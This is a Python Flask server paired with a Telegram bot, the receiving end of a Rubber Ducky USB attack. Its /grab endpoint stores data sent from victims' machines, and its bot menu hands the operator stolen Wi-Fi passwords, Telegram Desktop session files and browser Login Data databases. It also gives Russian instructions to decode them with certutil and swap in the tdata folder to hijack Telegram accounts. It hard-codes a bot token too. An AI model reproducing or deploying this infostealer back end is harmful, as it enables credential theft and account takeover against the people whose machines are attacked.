from flask import Flask, request, jsonify
import json
import os
from datetime import datetime
import requests
import base64

app = Flask(__name__)

# ============================================================
# ТОКЕН БОТА
# ============================================================
TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"

# ============================================================
# ПАПКА ДЛЯ ЛОГОВ
# ============================================================
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ============================================================
# ОТПРАВКА СООБЩЕНИЙ
# ============================================================
def send_message(chat_id, text, keyboard=None):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if keyboard:
        payload["reply_markup"] = json.dumps(keyboard)
    requests.post(url, json=payload)

def send_file(chat_id, file_path, caption=""):
    url = f"{TELEGRAM_API}/sendDocument"
    with open(file_path, 'rb') as f:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"document": f})

# ============================================================
# КЛАВИАТУРА
# ============================================================
def get_keyboard():
    return {
        "keyboard": [
            ["📊 Логи", "📥 Wi-Fi пароли"],
            ["📥 Telegram сессия", "📥 Браузеры"],
            ["📥 Все данные", "🗑️ Очистить"],
            ["📖 Инструкция"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

# ============================================================
# ОБРАБОТКА СООБЩЕНИЙ
# ============================================================
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if not data or "message" not in data:
        return "OK", 200
    
    chat_id = data["message"]["chat"]["id"]
    text = data["message"].get("text", "")
    
    if text == "/start":
        send_message(
            chat_id,
            "🪐 **DUCKY BOT v2.0**\n\n"
            "Все данные от Rubber Ducky разбиты по категориям.\n"
            "Выбери что хочешь посмотреть:",
            get_keyboard()
        )
    
    elif text == "📊 Логи":
        files = get_logs()
        if not files:
            send_message(chat_id, "📭 **Нет логов**")
        else:
            msg = "📊 **Список всех логов:**\n\n"
            for f in files[:10]:
                msg += f"📄 `{f}`\n"
            send_message(chat_id, msg)
    
    elif text == "📥 Wi-Fi пароли":
        data = get_latest_data()
        if not data:
            send_message(chat_id, "📭 **Нет данных**")
            return "OK", 200
        wifi = data.get("wifi", [])
        if not wifi:
            send_message(chat_id, "🔑 **Wi-Fi пароли не найдены**")
        else:
            msg = "🔑 **Wi-Fi пароли:**\n\n"
            for p in wifi:
                msg += f"📶 `{p}`\n"
            send_message(chat_id, msg)
    
    elif text == "📥 Telegram сессия":
        data = get_latest_data()
        if not data:
            send_message(chat_id, "📭 **Нет данных**")
            return "OK", 200
        tg = data.get("telegram", "")
        if not tg or len(tg) < 100:
            send_message(chat_id, "📭 **Telegram сессия не найдена**")
        else:
            # Сохраняем Base64 в файл
            b64_file = os.path.join(LOG_DIR, "telegram_session.b64")
            with open(b64_file, "w") as f:
                f.write(tg)
            send_file(chat_id, b64_file, caption="📁 **Telegram сессия** (Base64)\n\nДекодируй:\n`certutil -decode telegram_session.b64 tg.zip`")
    
    elif text == "📥 Браузеры":
        data = get_latest_data()
        if not data:
            send_message(chat_id, "📭 **Нет данных**")
            return "OK", 200
        browsers = data.get("browsers", [])
        if not browsers:
            send_message(chat_id, "📭 **Данные браузеров не найдены**")
        else:
            for i, b in enumerate(browsers):
                path = b.get("path", "unknown")
                b64 = b.get("data", "")
                if b64:
                    b64_file = os.path.join(LOG_DIR, f"browser_{i}.b64")
                    with open(b64_file, "w") as f:
                        f.write(b64)
                    send_file(chat_id, b64_file, caption=f"📁 **Браузер:** `{path}`\n\nДекодируй:\n`certutil -decode browser_{i}.b64 LoginData_{i}.db`")
    
    elif text == "📥 Все данные":
        data = get_latest_data()
        if not data:
            send_message(chat_id, "📭 **Нет данных**")
            return "OK", 200
        # Сохраняем полный JSON
        json_file = os.path.join(LOG_DIR, "full_data.json")
        with open(json_file, "w") as f:
            json.dump(data, f, indent=2)
        send_file(chat_id, json_file, caption="📁 **Все данные** (полный JSON)")
    
    elif text == "🗑️ Очистить":
        for f in os.listdir(LOG_DIR):
            os.remove(os.path.join(LOG_DIR, f))
        send_message(chat_id, "✅ **Все логи удалены**")
    
    elif text == "📖 Инструкция":
        send_message(
            chat_id,
            "📖 **ИНСТРУКЦИЯ**\n\n"
            "1️⃣ **Wi-Fi пароли** — приходят сразу, можно скопировать\n\n"
            "2️⃣ **Telegram сессия** — скачай `.b64` файл, декодируй:\n"
            "   `certutil -decode telegram_session.b64 tg.zip`\n"
            "   Распакуй и замени `%AppData%\\Telegram Desktop\\tdata`\n\n"
            "3️⃣ **Браузеры** — скачай `.b64` файлы, декодируй:\n"
            "   `certutil -decode browser_0.b64 LoginData_0.db`\n"
            "   Пароли в файле Login Data (SQLite)\n\n"
            "⚠️ **Используй только для тестов!**"
        )
    
    else:
        send_message(chat_id, "❓ Используй кнопки меню.", get_keyboard())
    
    return "OK", 200

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ
# ============================================================
def get_logs():
    files = [f for f in os.listdir(LOG_DIR) if f.endswith('.json')]
    return sorted(files, reverse=True)

def get_latest_data():
    files = get_logs()
    if not files:
        return None
    path = os.path.join(LOG_DIR, files[0])
    with open(path, 'r') as f:
        return json.load(f)

# ============================================================
# ПРИНИМАЕТ POST ОТ RUBBER DUCKY
# ============================================================
@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.get_json()
        if not data:
            data = {"raw": request.get_data(as_text=True)}

        name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        path = os.path.join(LOG_DIR, name)

        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        print(f"[+] Saved: {name}")
        return jsonify({"status": "OK", "file": name}), 200

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/')
def index():
    return "🪐 Ducky Bot is running!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
